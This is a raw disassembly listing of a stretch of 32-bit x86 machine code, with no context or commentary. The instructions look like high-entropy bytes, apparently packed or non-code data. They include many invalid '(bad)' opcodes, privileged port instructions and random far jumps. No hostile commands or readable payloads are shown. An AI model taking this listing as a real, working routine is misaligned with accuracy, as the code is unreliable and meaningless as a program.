  4184bf:	pop    eax
  4184c0:	hlt    
  4184c1:	cdq    
  4184c2:	and    DWORD PTR [edx+edx*2+0x7e8af695],esp
  4184c9:	loopne 0x41849e
  4184cb:	pop    ebp
  4184cc:	jmp    0x10c21d3b
  4184d1:	jle    0x418486
  4184d3:	pusha  
  4184d4:	xor    BYTE PTR [edx-0x7e],cl
  4184d7:	sahf   
  4184d8:	xchg   edx,eax
  4184d9:	mov    edi,0xbec2bcda
  4184de:	jns    0x418535
  4184e0:	sbb    BYTE PTR [edi+0x2],ah
  4184e3:	xchg   ebp,eax
  4184e4:	jge    0x4184d7
  4184e6:	push   0xffffffbe
  4184e8:	adc    eax,0x212733b7
  4184ed:	int    0xd3
  4184ef:	jae    0x41847d
  4184f1:	inc    eax
  4184f2:	and    al,0x1e
  4184f4:	inc    esp
  4184f5:	pop    eax
  4184f6:	push   es
  4184f7:	pop    esi
  4184f8:	sub    eax,0xc0d353c7
  4184fd:	lods   eax,DWORD PTR ds:[esi]
  4184fe:	cld    
  4184ff:	popa   
  418500:	xor    esp,DWORD PTR [ecx+ecx*1+0x15b8fd38]
  418507:	cmp    DWORD PTR [edx-0x6393b931],edx
  41850d:	imul   eax,DWORD PTR [ebp+0x11],0x7b15475a
  418514:	adc    eax,edx
  418516:	pop    esi
  418517:	mov    ecx,0xf0d71539
  41851c:	adc    bh,ah
  41851e:	(bad)  
  41851f:	mov    ebx,0x4e3ddfab
  418524:	push   ebx
  418525:	cmp    dh,BYTE PTR [ecx+ecx*8-0x5c2f467e]
  41852c:	sub    bh,BYTE PTR [ebx+0x80414be]
  418532:	aaa    
  418533:	pop    eax
  418534:	les    ebx,FWORD PTR [eax-0x58e4fe24]
  41853a:	cmp    al,0xbf
  41853c:	add    dl,bh
  41853e:	outs   dx,BYTE PTR ds:[esi]
  41853f:	or     ebx,eax
  418541:	or     eax,0xb0aa9414
  418546:	mov    ebx,0xe1e57e44
  41854b:	out    dx,al
  41854c:	out    dx,al
  41854d:	inc    ebp
  41854e:	jle    0x4185a9
  418550:	push   es
  418551:	enter  0x1c92,0xcd
  418555:	jae    0x1ae096e5
  41855b:	hlt    
  41855c:	inc    eax
  41855d:	rcl    DWORD PTR [edi*8-0x7a42cef4],0x74
  418565:	adc    edi,DWORD PTR [ebp+0x1b]
  418568:	inc    edx
  418569:	jge    0x418591
  41856b:	xor    al,0x4a
  41856d:	and    ah,BYTE PTR [eax-0x3c]
  418570:	stos   DWORD PTR es:[edi],eax
  418571:	dec    edx
  418572:	movsx  edx,BYTE PTR [edi-0xa84be1f]
  418579:	mov    dl,0xa8
  41857b:	pushf  
  41857c:	or     al,0xec
  41857e:	repz clc 
  418580:	int3   
  418581:	(bad)
  418584:	inc    ecx
  418585:	cmp    bl,dl
  418587:	sbb    al,BYTE PTR [edx-0x780be339]
  41858d:	cs push ecx
  41858f:	push   0xf17eb392
  418594:	cmc    
  418595:	mov    bh,0x61
  418597:	mov    fs,WORD PTR [ecx]
  418599:	call   FWORD PTR [ebp-0x5b62c9d6]
  41859f:	xchg   edi,eax
  4185a0:	cmp    BYTE PTR [eax],dl
  4185a2:	repz ret 
  4185a4:	leave  
  4185a5:	xlat   BYTE PTR ds:[ebx]
  4185a6:	xchg   DWORD PTR [edi],edx
  4185a8:	xchg   DWORD PTR [edi+0x2b],edx
  4185ab:	and    ecx,esp
  4185ad:	cli    
  4185ae:	sub    eax,0x620c38c4
  4185b3:	jle    0x41857c
  4185b5:	fld    DWORD PTR [ecx+edi*2-0x483a266c]
  4185bc:	mov    ds:0x585afa2e,eax
  4185c1:	out    0x84,al
  4185c3:	(bad)  
  4185c4:	mov    esp,0xd21628d7
  4185c9:	mov    fs,WORD PTR [eax+0x5a36683e]
  4185cf:	mov    WORD PTR [eax-0x66],fs
  4185d2:	dec    ebx
  4185d3:	mov    edx,DWORD PTR [ecx+0xd]
  4185d6:	pop    ebx
  4185d7:	into   
  4185d8:	inc    edi
  4185d9:	xchg   esp,eax
  4185da:	jns    0x41861d
  4185dc:	bound  eax,QWORD PTR [ebp+0x42]
  4185df:	sar    DWORD PTR [edi-0x5d9cbf9e],0x3d
  4185e6:	mov    edi,0x573d7012
  4185eb:	cmp    ecx,DWORD PTR ss:[ecx+0x2acbda41]
  4185f2:	jbe    0x41859f
  4185f4:	jnp    0x4185b0
  4185f6:	jg     0x41860d
  4185f8:	push   edi
  4185f9:	adc    esi,DWORD PTR [ecx]
  4185fb:	jmp    0xea95:0xc61b632d
  418602:	rcl    dh,0x61
  418605:	in     eax,dx
  418606:	xor    al,0x75
  418608:	(bad)  
  418609:	dec    ebp
  41860a:	lds    ebp,FWORD PTR [esi-0x7b]
  41860d:	mov    esi,DWORD PTR [edx-0xc]
  418610:	daa    
  418611:	(bad)  
  418612:	xor    edi,ebx
  418614:	xchg   edx,eax
  418615:	(bad)  
  418616:	les    ebx,FWORD PTR [edx+0x7702ffc8]
  41861c:	mov    es,WORD PTR [ebp-0x76deb4a3]
  418622:	sub    ch,BYTE PTR [ebx+eax*4-0x1a26b006]
  418629:	test   BYTE PTR [ebx-0x4c8063f3],cl
  41862f:	pop    ss
  418630:	jno    0x4185d3
  418632:	or     DWORD PTR [ebx],edx
  418634:	out    dx,al
  418635:	call   0x9848:0x8ea4e6aa
  41863c:	std    
  41863d:	leave  
  41863e:	mov    al,ds:0x8daaec84
  418643:	dec    edx
  418644:	mov    al,0x8
  418647:	test   DWORD PTR [eax+0x607d3c6a],0x469f6159
  418651:	les    esp,FWORD PTR [eax-0x53655b05]
  418657:	inc    ebx
  418658:	cld    
  418659:	dec    esi
  41865a:	cmc    
  41865b:	sub    DWORD PTR [eax+0x6e8b8a65],ebp
  418661:	lea    ecx,[esi+0x609c4158]
  418667:	js     0x41868f
  418669:	call   0x5fc9:0xb0ed05c6
  418670:	jl     0x418645
  418672:	jle    0x418628
  418674:	imul   esi,DWORD PTR [edx+0x5f],0xce7964e0
  41867b:	xor    ah,BYTE PTR [ebp+0x7b799959]
  418681:	sbb    BYTE PTR [esi-0x1],0x12
  418685:	mov    dh,0xe9
  418687:	fdiv   QWORD PTR [edi]
  418689:	retf   0xad63
  41868c:	leave  
  41868d:	mov    ebx,0xe6d12fc8
  418692:	xchg   DWORD PTR [eax+0x7fd107ea],ebx
  418698:	mov    esp,0x14cbbe7d
  41869d:	rol    DWORD PTR [ebp+0x4b8f5a4],1
  4186a3:	sar    dh,cl
  4186a5:	ret    
  4186a6:	sub    BYTE PTR [ebx+0xf99ef18],ah
  4186ac:	sbb    BYTE PTR [esi+ecx*1+0x1ae3059c],0x4f
  4186b4:	sbb    ebp,DWORD PTR [ecx+0x1a]
  4186b7:	add    al,0xff
  4186b9:	lods   eax,DWORD PTR ds:[esi]
  4186ba:	jmp    0x418723
  4186bc:	xchg   ecx,eax
  4186bd:	cmp    esp,0xdd6201b0
  4186c3:	or     BYTE PTR [ecx-0x6caacbe4],bh
  4186c9:	push   esi
  4186ca:	pushf  
  4186cb:	sar    BYTE PTR [esi-0x107bbf4],cl
  4186d1:	shl    DWORD PTR [ecx-0x7b],1
  4186d4:	cli    
  4186d5:	(bad)  
  4186d7:	test   al,0x6
  4186d9:	and    eax,0xa64c57b
  4186de:	and    dl,BYTE PTR [eax+0x4cd5eede]
  4186e4:	js     0x418705
  4186e6:	inc    ecx
  4186e7:	cmp    al,0xae
  4186e9:	adc    ch,BYTE PTR [ebp+0x5b10abb9]
  4186ef:	pushf  
  4186f0:	dec    ebp
  4186f1:	dec    ebp
  4186f2:	popa   
  4186f3:	mov    ah,0x21
  4186f5:	inc    esi
  4186f6:	loopne 0x418756
  4186f8:	stos   DWORD PTR es:[edi],eax
  4186f9:	clc    
  4186fa:	mov    DWORD PTR [ebp+esi*4-0x3b],ebx
  4186fe:	and    BYTE PTR [edx-0x58332cc9],bh
  418704:	retf   
  418705:	add    ah,BYTE PTR [esi]
  418707:	stos   BYTE PTR es:[edi],al
  418708:	imul   ecx,DWORD PTR [edi-0x33],0xe445cfda
  41870f:	aaa    
  418710:	dec    ebx
  418711:	daa    
  418712:	and    DWORD PTR [edi],esp
  418714:	mov    edi,0xfb240eff
  418719:	repz sbb al,0xcc
  41871c:	jno    0x41877c
  41871e:	cs lahf 
  418720:	es push es
  418722:	cmc    
  418723:	iret   
  418724:	push   edi
  418725:	jbe    0x41877a
  418727:	mov    eax,0xf401a500
  41872c:	sar    bl,cl
  41872e:	and    ebp,DWORD PTR ds:0xbf4f0921
  418734:	mov    edx,0xd3e57944
  418739:	cmp    dl,BYTE PTR [ebx+0x39b15ff4]
  41873f:	and    BYTE PTR [esi+0x56],cl
  418742:	in     eax,dx
  418743:	aad    0xed
  418745:	push   es
  418746:	jmp    0xdb6d:0xb3ef4ff7
  41874d:	add    DWORD PTR [edx-0x737859f4],eax
  418753:	out    0xf4,al
  418755:	fs popf 
  418757:	jb     0x4187a7
  418759:	or     eax,DWORD PTR [ebx+ebp*2-0x76]
  41875d:	jg     0x418737
  41875f:	and    dh,ah
  418761:	fist   DWORD PTR [esi]
  418763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418764:	jae    0x418797
  418766:	imul   edx,DWORD PTR [ecx-0x30cae4ce],0x45
  41876d:	bnd jle 0x41874c
  418770:	lea    ebp,[edi-0x44]
  418773:	imul   edx,DWORD PTR [edx-0xc],0xec341446
  41877a:	cdq    
  41877b:	rcl    DWORD PTR [ecx+esi*8+0x50d74f04],1
  418782:	fiadd  DWORD PTR [ecx]
  418784:	mov    ds:0x1aa0b238,eax
  418789:	dec    edi
  41878a:	fld    TBYTE PTR [esi]
  41878c:	rcr    al,1
  41878e:	fwait
  41878f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418790:	icebp  
  418791:	push   ds
  418792:	push   ebp
  418793:	adc    al,0xa4
  418795:	sbb    ecx,DWORD PTR [ecx]
  418797:	sbb    DWORD PTR [ebx],ebp
  418799:	xchg   ebx,eax
  41879a:	push   edi
  41879b:	xor    eax,0xd5e4e422
  4187a0:	(bad)  
  4187a1:	push   edx
  4187a2:	push   0xd00c65e7
  4187a7:	mov    esp,0x3dfae6f3
  4187ac:	sbb    al,0xd8
  4187ae:	sbb    DWORD PTR [edx],ecx
  4187b0:	dec    eax
  4187b1:	push   ss
  4187b2:	inc    ebx
  4187b3:	lahf   
  4187b4:	xor    ebp,DWORD PTR [ebp+0x78]
  4187b7:	nop
  4187b8:	xor    BYTE PTR [ebp+0x4a],cl
  4187bb:	adc    ah,ch
  4187bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187be:	or     eax,0xc2007b33
  4187c3:	lea    ebx,[edx-0x3e9e298e]
  4187c9:	mov    ah,0xbf
  4187cb:	mov    al,0x2
  4187cd:	adc    BYTE PTR [ebp+0x47ec656b],0x83
  4187d4:	repz enter 0x1d9,0x1f
  4187d9:	mov    dh,0x8d
  4187db:	imul   esi,DWORD PTR [ebx-0x50],0xfffffff6
  4187df:	mulps  xmm3,XMMWORD PTR [ebp-0xcfaade5]
  4187e6:	adc    DWORD PTR ds:0x9e933f29,ebx
  4187ec:	es stos DWORD PTR es:[edi],eax
  4187ee:	sbb    eax,0xea20ca1e
  4187f3:	or     esi,eax
  4187f5:	add    al,0x75
  4187f7:	sbb    al,0xbd
  4187f9:	inc    ecx
  4187fa:	jmp    0x4187e8
  4187fc:	mov    ch,0x25
  4187fe:	push   ds
  4187ff:	jae    0x4187f9
  418801:	add    ebp,eax
  418803:	dec    esi
  418804:	lods   eax,DWORD PTR ds:[esi]
  418805:	popf   
  418806:	les    edx,FWORD PTR [ebp+0x7e]
  418809:	out    dx,eax
  41880a:	add    DWORD PTR [edx],0xffffffca
  41880d:	in     al,dx
  41880e:	and    al,BYTE PTR [esi+0x64615279]
  418814:	out    dx,al
  418815:	push   ebp
  418816:	sahf   
  418817:	xor    al,0x56
  418819:	mov    ?,edi
  41881b:	cmp    edx,edi
  41881d:	jno    0x418874
  41881f:	loopne 0x4187e5
  418821:	mov    ebp,0xaec354ce
  418826:	scas   al,BYTE PTR es:[edi]
  418827:	push   ds
  418828:	ds aad 0x69
  41882b:	and    dl,0xf4
  41882e:	into   
  41882f:	cmp    eax,0x72e3cdd7
  418834:	pop    es
  418835:	mov    ebp,0x56109a4c
  41883a:	add    eax,0xeedb8dd7
  41883f:	je     0x41889c
  418841:	cmc    
  418842:	xor    al,0x7c
  418844:	hlt    
  418845:	loope  0x4187d2
  418847:	sub    eax,0x3a1ded56
  41884c:	jo     0x418809
  41884e:	in     al,0x1c
  418850:	dec    DWORD PTR [edx+0x30]
  418853:	shl    DWORD PTR [esp+esi*8],1
  418856:	xchg   edx,eax
  418857:	mov    edi,DWORD PTR [edx]
  418859:	xchg   ebx,eax
  41885a:	lea    edi,[esi-0x24]
  41885d:	push   0xffffffd7
  41885f:	xchg   ebp,eax
  418860:	int    0xee
  418862:	push   ebp
  418863:	das    
  418864:	call   0x67bb9107
  418869:	and    bl,bl
  41886b:	aas    
  41886c:	xchg   bp,ax
  41886e:	mov    ?,WORD PTR [ebx+0x6fcc6aa8]
  418874:	call   FWORD PTR [edx]
  418876:	test   DWORD PTR [ebx],0xfdc102d1
  41887c:	sbb    DWORD PTR [ecx-0x29],edx
  41887f:	adc    DWORD PTR [ecx-0x16],edx
  418882:	in     al,dx
  418883:	dec    eax
  418884:	inc    ecx
  418885:	sti    
  418886:	mov    WORD PTR [eax],?
  418888:	or     eax,0xad81c98c
  41888d:	cmp    BYTE PTR [ecx-0x43],al
  418890:	popa   
  418891:	inc    ecx
  418892:	(bad)  
  418893:	mov    BYTE PTR [ebx-0x223dd722],ch
  418899:	(bad)  
  41889a:	retf   
  41889b:	pop    dx
  41889d:	test   eax,0x178bede3
  4188a2:	inc    ecx
  4188a3:	cmp    DWORD PTR [esi+0x178ce8ca],eax
  4188a9:	pop    ss
  4188aa:	sub    ebx,DWORD PTR [eax-0x5c]
  4188ad:	sub    DWORD PTR [edx-0x3b50a520],esp
  4188b3:	jmp    0x5a0:0x4400e56a
  4188ba:	cmc    
  4188bb:	jle    0x4188c0
  4188bd:	xchg   esi,eax
  4188be:	cli    
  4188bf:	pop    ebp
  4188c0:	push   0xffffffd7
  4188c2:	sbb    DWORD PTR [edx+eiz*2-0xf5bb2fd],eax
  4188c9:	js     0x4188cf
  4188cb:	push   cs
  4188cc:	jmp    0x21c4ea9d
  4188d1:	cmp    DWORD PTR [edi-0x10],ebx
  4188d4:	mov    DWORD PTR [ebp+0x65],eax
  4188d7:	sahf   
  4188d8:	retf   
  4188d9:	sbb    eax,0x4f7ac0ee
  4188de:	jle    0x4188bd
  4188e0:	call   0x4795:0xd6086184
  4188e7:	in     al,dx
  4188e8:	jge    0x41890e
  4188ea:	outs   dx,DWORD PTR ds:[esi]
  4188eb:	in     al,0x16
  4188ed:	icebp  
  4188ee:	xchg   esi,eax
  4188ef:	adc    esi,DWORD PTR [ecx-0x4be30ff]
  4188f5:	xchg   edi,eax
  4188f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188f8:	ret    0x6adb
  4188fb:	popa   
  4188fc:	loop   0x418935
  4188fe:	add    BYTE PTR [edx+ecx*4+0x52],al
  418902:	je     0x41895a
  418904:	cwde   
  418905:	adc    eax,0x75e0174b
  41890a:	mov    esp,0x94072d34
  41890f:	adc    BYTE PTR [edi+ecx*1-0x42],cl
  418913:	dec    edx
  418914:	add    DWORD PTR [edi],edi
  418916:	jb     0xca68e677
  41891c:	dec    ebp
  41891d:	sub    al,al
  41891f:	hlt    
  418920:	inc    edi
  418921:	dec    eax
  418922:	addr16 je 0x4188ce
  418925:	call   0xbf572053
  41892a:	jl     0x418976
  41892c:	pmaxub mm0,QWORD PTR [edx-0x7c]
  418930:	repnz retf 
  418932:	cmp    DWORD PTR [ebx],ebx
  418934:	mov    fs,WORD PTR [ebx+0x4e9bd92b]
  41893a:	aam    0x60
  41893c:	dec    ebp
  41893d:	fmulp  st(0),st
  41893f:	sbb    DWORD PTR [edi+0x38782338],ebx
  418945:	xor    ch,ch
  418947:	in     eax,dx
  418948:	or     ebx,ebx
  41894a:	shl    DWORD PTR [ebp-0x66],1
  41894d:	mov    al,ds:0x44ac49f2
  418952:	daa    
  418953:	inc    ebx
  418954:	add    BYTE PTR [esi],0x79
  418957:	pop    esi
  418958:	(bad)  
  418959:	push   ebp
  41895a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41895b:	mov    al,0x6d
  41895d:	bound  esi,QWORD PTR [ebx+0x4d]
  418960:	lahf   
  418961:	pop    esp
  418962:	in     eax,0x32
  418964:	or     BYTE PTR [edx-0x3decd912],bl
  41896a:	into   
  41896b:	fisubr DWORD PTR [ebp+eax*4+0x3c6066b7]
  418972:	iret   
  418973:	retf   0x8e54
  418976:	mov    cl,0xaa
  418978:	add    dh,BYTE PTR [esp+edi*8+0x62]
  41897c:	dec    eax
  41897d:	cmp    ebx,DWORD PTR [ebp+0x14]
  418980:	push   esp
  418981:	test   DWORD PTR ds:0x7be062dc,edx
  418987:	(bad)  
  418988:	jl     0x41897b
  41898a:	imul   DWORD PTR [edi+esi*1]
  41898d:	xor    DWORD PTR [esp+ecx*8],ebp
  418990:	push   edi
  418991:	ret    0x473d
  418994:	or     DWORD PTR [ebp-0x53],ebp
  418997:	int    0x95
  418999:	cmc    
  41899a:	push   edx
  41899b:	shr    BYTE PTR ds:0xb2536e66,1
  4189a1:	gs cmp eax,0x285b7de6
  4189a7:	icebp  
  4189a8:	push   es
  4189a9:	je     0x4189f1
  4189ab:	ror    BYTE PTR [eax+edx*1+0x7d],0xa4
  4189b0:	out    dx,al
  4189b1:	dec    BYTE PTR [eax+eiz*4-0x35]
  4189b5:	idiv   DWORD PTR [esi+0x18]
  4189b8:	out    dx,eax
  4189b9:	mov    al,0xc0
  4189bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189bc:	pop    ebp
  4189bd:	scas   ax,WORD PTR es:[edi]
  4189bf:	mov    dl,0xb5
  4189c1:	fadd   QWORD PTR [edx]
  4189c3:	mov    al,ds:0x54787591
  4189c8:	sbb    ch,ch
  4189ca:	loope  0x418993
  4189cc:	xchg   edi,eax
  4189cd:	data16 jl 0x4189aa
  4189d0:	fwait
  4189d1:	cwde   
  4189d2:	rcl    DWORD PTR [ebx-0x43],cl
  4189d5:	mov    ss,WORD PTR [edx]
  4189d7:	data16 jle 0x4189e4
  4189da:	cwde   
  4189db:	mov    ch,BYTE PTR [edx]
  4189dd:	and    BYTE PTR [esi+0x7c],dl
  4189e0:	xor    dh,ch
  4189e2:	lods   al,BYTE PTR ds:[esi]
  4189e3:	lea    esi,[ecx]
  4189e5:	mov    eax,ds:0x5f691d9f
  4189ea:	or     al,0x4a
  4189ec:	or     ebp,edx
  4189ee:	lods   al,BYTE PTR ds:[esi]
  4189ef:	in     al,dx
  4189f0:	rcr    dh,cl
  4189f2:	jno    0x418a66
  4189f4:	add    BYTE PTR [ebx+0x474ba971],al
  4189fa:	pop    ss
  4189fb:	repz dec esi
  4189fd:	cmc    
  4189fe:	inc    ebp
  4189ff:	xlat   BYTE PTR ds:[ebx]
  418a00:	retf   0xdaf1
  418a03:	jg     0x418a4a
  418a05:	cmp    BYTE PTR [edx-0x11],cl
  418a08:	push   edx
  418a09:	loope  0x418a1c
  418a0b:	add    edi,DWORD PTR [eax-0x112ee60f]
  418a11:	push   edi
  418a12:	ins    DWORD PTR es:[edi],dx
  418a13:	lods   eax,DWORD PTR ds:[esi]
  418a14:	lods   al,BYTE PTR ds:[esi]
  418a15:	dec    ebp
  418a16:	pop    ds
  418a17:	mov    edi,esp
  418a19:	mov    cl,0x6b
  418a1b:	test   DWORD PTR [esi+0x2a],edi
  418a1e:	jns    0x4189ee
  418a20:	and    al,0x94
  418a22:	inc    edx
  418a23:	dec    eax
  418a24:	shl    DWORD PTR [ebx-0x6b45fe0],cl
  418a2a:	fild   QWORD PTR [edx]
  418a2c:	sbb    dh,al
  418a2e:	dec    esi
  418a2f:	pushf  
  418a30:	adc    al,0xbe
  418a32:	add    ebx,DWORD PTR [esp+eiz*8-0x6c]
  418a36:	push   esp
  418a37:	and    eax,0xf0c5a1f
  418a3c:	ror    bl,0xa0
  418a3f:	popf   
  418a40:	push   esi
  418a41:	pop    edx
  418a42:	and    esi,DWORD PTR [esi-0x6f]
  418a45:	mov    bh,0xd9
  418a47:	popf   
  418a48:	jb     0x4189e7
  418a4a:	cmovnp ebx,DWORD PTR [edi]
  418a4d:	push   ebp
  418a4e:	cmp    bl,BYTE PTR [edi]
  418a50:	das    
  418a51:	adc    ecx,eax
  418a53:	mov    dh,0xa0
  418a55:	ins    DWORD PTR es:[edi],dx
  418a56:	mov    bl,BYTE PTR [ecx-0x1a]
  418a59:	push   ebp
  418a5a:	dec    ecx
  418a5b:	jns    0x418a1e
  418a5d:	xor    al,0x49
  418a5f:	mov    al,ds:0xdcb12f2
  418a64:	and    esi,DWORD PTR [edx]
  418a66:	fidivr DWORD PTR [ecx]
  418a68:	jle    0x418ae9
  418a6a:	inc    ebx
  418a6b:	cwde   
  418a6c:	sbb    ah,BYTE PTR [edi+ebx*2-0x76265bbd]
  418a73:	shl    bl,0x90
  418a76:	pop    ss
  418a77:	in     al,dx
  418a78:	test   al,0x5d
  418a7a:	pop    ebp
  418a7b:	sahf   
  418a7c:	clc    
  418a7d:	js     0x418a52
  418a7f:	xor    eax,0xb5b5328
  418a84:	mov    bl,0xd0
  418a86:	ss push ds
  418a88:	dec    eax
  418a89:	dec    eax
  418a8a:	ds push ebx
  418a8c:	(bad)  
  418a8d:	mov    esp,0x3c28a832
  418a92:	xor    ecx,edx
  418a94:	in     eax,0xec
  418a96:	cmp    dl,dh
  418a98:	(bad)  
  418a9a:	repz arpl WORD PTR [ecx+edx*4+0xc],bp
  418a9f:	inc    ebx
  418aa0:	mov    ebp,0xba45d757
  418aa5:	dec    ebp
  418aa6:	jecxz  0x418ac4
  418aa8:	inc    ebp
  418aa9:	sti    
  418aaa:	call   0x1cc1:0x18460e51
  418ab1:	shl    DWORD PTR [ecx-0xe],cl
  418ab4:	inc    esi
  418ab5:	jb     0x418aef
  418ab7:	rcl    DWORD PTR [ecx],1
  418ab9:	pop    edi
  418aba:	std    
  418abb:	loop   0x418ab2
  418abd:	jl     0x418a86
  418abf:	cmp    esi,esi
  418ac1:	cwde   
  418ac2:	adc    ecx,ebx
  418ac4:	xchg   DWORD PTR [edx],edx
  418ac6:	pop    edx
  418ac7:	push   cs
  418ac8:	push   0x2f121041
  418acd:	retf   
  418ace:	(bad)  
  418acf:	fimul  WORD PTR [eax]
  418ad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ad2:	and    bl,al
  418ad4:	mov    eax,DWORD PTR [edi+0x4c]
  418ad7:	fadd   st,st(0)
  418ad9:	sbb    DWORD PTR [ebx+eiz*8],0xffffff92
  418add:	cli    
  418ade:	lods   eax,DWORD PTR ds:[esi]
  418adf:	xor    eax,0x8bfe679d
  418ae4:	cmp    bh,dl
  418ae6:	sub    DWORD PTR [esi],0xffffffa4
  418ae9:	sbb    al,0x4e
  418aeb:	mov    dl,0x47
  418aed:	or     DWORD PTR [edx],esi
  418aef:	jns    0x418a97
  418af1:	rcr    DWORD PTR [edi-0x52],1
  418af4:	jge    0x418b49
  418af6:	jne    0x418aeb
  418af8:	psubsw mm5,mm5
  418afb:	inc    edx
  418afc:	pop    ss
  418afd:	add    BYTE PTR [ebx+0x13ee3f48],al
  418b03:	ds aad 0x10
  418b06:	cmc    
  418b07:	push   edi
  418b08:	stc    
  418b09:	int    0x5a
  418b0b:	jns    0x418aeb
  418b0d:	(bad)  
  418b0e:	mov    ds:0x2d3e8d78,eax
  418b13:	sub    esp,ebp
  418b15:	ins    BYTE PTR es:[edi],dx
  418b16:	cli    
  418b17:	icebp  
  418b18:	dec    edx
  418b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b1a:	es data16 adc al,0xfd
  418b1e:	xlat   BYTE PTR ds:[ebx]
  418b1f:	mov    al,ds:0xe0b5dc0d
  418b24:	out    dx,al
  418b25:	call   0x1f2a94b
  418b2a:	mov    eax,ds:0xef15aa42
  418b2f:	mul    ecx
  418b31:	jmp    0x5a42:0x1912991a
  418b38:	inc    ebx
  418b39:	and    al,0xd0
  418b3b:	outs   dx,DWORD PTR ds:[esi]
  418b3c:	inc    edx
  418b3d:	push   cs
  418b3e:	sub    al,BYTE PTR [eax-0x10]
  418b41:	pop    ecx
  418b42:	sub    ebx,edx
  418b44:	outs   dx,DWORD PTR ds:[esi]
  418b45:	ss cmp DWORD PTR gs:[ecx],ebp
  418b49:	mov    al,ds:0x9bc54b78
  418b4e:	icebp  
  418b4f:	mov    esi,0xc037386c
  418b54:	rcl    DWORD PTR [ecx+0x5d729574],cl
  418b5a:	jmp    0x418b68
  418b5c:	adc    al,BYTE PTR [esi]
  418b5e:	inc    esi
  418b5f:	push   0x17
  418b61:	cli    
  418b62:	mov    al,ds:0x6b02a811
  418b67:	dec    esp
  418b68:	adc    ecx,DWORD PTR [edx-0x352d6ba4]
  418b6e:	jnp    0x418b4b
  418b70:	cld    
  418b71:	mov    dl,0x1a
  418b74:	xor    dl,BYTE PTR [esp+ecx*8]
  418b77:	ins    BYTE PTR es:[edi],dx
  418b78:	scas   al,BYTE PTR es:[edi]
  418b79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b7a:	pop    ebx
  418b7b:	repnz mov eax,0x43094a98
  418b81:	cld    
  418b82:	stos   BYTE PTR es:[edi],al
  418b83:	mov    al,0xb3
  418b85:	or     BYTE PTR [ebx],dh
  418b87:	sahf   
  418b88:	fist   WORD PTR [ebx]
  418b8a:	cdq    
  418b8b:	cmp    eax,0x84e37b6
  418b90:	push   edi
  418b91:	fimul  DWORD PTR [ebx]
  418b93:	or     BYTE PTR [edx+0x3],dl
  418b96:	or     eax,0x48efaa60
  418b9b:	inc    esp
  418b9c:	data16 stc 
  418b9e:	test   BYTE PTR [eax+0x18],al
  418ba1:	dec    eax
  418ba2:	xor    DWORD PTR [ecx-0x30],edx
  418ba5:	xchg   edi,eax
  418ba6:	cmp    esi,edi
  418ba8:	adc    ebp,DWORD PTR [eax+0x27]
  418bab:	inc    esp
  418bac:	test   al,0x34
  418bae:	fnstsw WORD PTR [edi]
  418bb0:	gs pop esi
  418bb2:	out    dx,eax
  418bb3:	sahf   
  418bb4:	sub    eax,0xa3544a56
  418bb9:	popa   
  418bba:	lock cmp bh,al
  418bbd:	(bad)  
  418bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bbf:	xchg   esi,eax
  418bc0:	cmp    ebp,DWORD PTR fs:[edx+0x72]
  418bc4:	ja     0x418c2d
  418bc6:	ds (bad) 
  418bc8:	jae    0x418bb6
  418bca:	sub    BYTE PTR [ebx],0x36
  418bcd:	push   esp
  418bce:	aaa    
  418bcf:	mov    ch,0x1f
  418bd1:	icebp  
  418bd2:	pop    esi
  418bd3:	mov    ebx,DWORD PTR [eax+0x60231288]
  418bd9:	dec    ebp
  418bda:	bnd jne 0x418c52
  418bdd:	or     dh,BYTE PTR [ecx+ecx*8-0x4b]
  418be1:	jmp    0x418ba2
  418be3:	xor    BYTE PTR [edx+0x4b],0xa7
  418be7:	gs mov ecx,ebx
  418bea:	push   ebp
  418beb:	mov    ds:0x48886944,eax
  418bf0:	mov    eax,edx
  418bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bf3:	xor    cl,dh
  418bf5:	pop    ss
  418bf6:	loope  0x418c71
  418bf8:	fistp  QWORD PTR [edi]
  418bfa:	std    
  418bfb:	or     eax,0xf21380ca
  418c00:	mov    dh,0xa7
  418c02:	js     0x418be0
  418c04:	sbb    esi,DWORD PTR [ecx-0x21]
  418c07:	and    DWORD PTR [ecx-0x51],ebx
  418c0a:	cmp    DWORD PTR [eax-0x40],ecx
  418c0d:	repz push ss
  418c0f:	mov    esi,0xf1c882c
  418c14:	test   DWORD PTR [esi-0x46],esp
  418c17:	jnp    0x418c63
  418c19:	outs   dx,BYTE PTR ds:[esi]
  418c1a:	sbb    ah,dl
  418c1c:	jl     0x418bce
  418c1e:	popf   
  418c1f:	push   edx
  418c20:	scas   eax,DWORD PTR es:[edi]
  418c21:	adc    esi,eax
  418c23:	jno    0x418c95
  418c25:	das    
  418c26:	cli    
  418c27:	gs call 0xa16e:0x8fc32370
  418c2f:	push   edx
  418c30:	ret    
  418c31:	jg     0x418bed
  418c33:	dec    esp
  418c34:	shl    DWORD PTR [eax],1
  418c36:	pop    edi
  418c37:	add    dl,BYTE PTR [ecx]
  418c39:	test   BYTE PTR [edx],al
  418c3b:	xchg   edi,eax
  418c3c:	inc    edi
  418c3d:	rcl    DWORD PTR [edx+0x67],0x9c
  418c41:	aad    0xd0
  418c43:	aaa    
  418c44:	es loopne 0x418c0c
  418c47:	inc    edx
  418c48:	add    ebx,DWORD PTR [ebp+0x7b5cc876]
  418c4e:	imul   esp,DWORD PTR [esp+edi*1],0xffffffba
  418c52:	mov    al,ds:0x5310eb0e
  418c57:	fs fwait
  418c59:	inc    ebp
  418c5a:	test   al,0x4c
  418c5c:	imul   eax,esp,0x42
  418c5f:	iret   
  418c60:	mov    bh,0x60
  418c62:	push   es
  418c63:	mov    al,0x62
  418c65:	aad    0xff
  418c67:	dec    ecx
  418c68:	inc    edx
  418c69:	pop    ds
  418c6a:	add    eax,0xa04f9e05
  418c6f:	arpl   WORD PTR [eax-0x4ff46bfc],di
  418c75:	call   0xebbe:0x7bda9c96
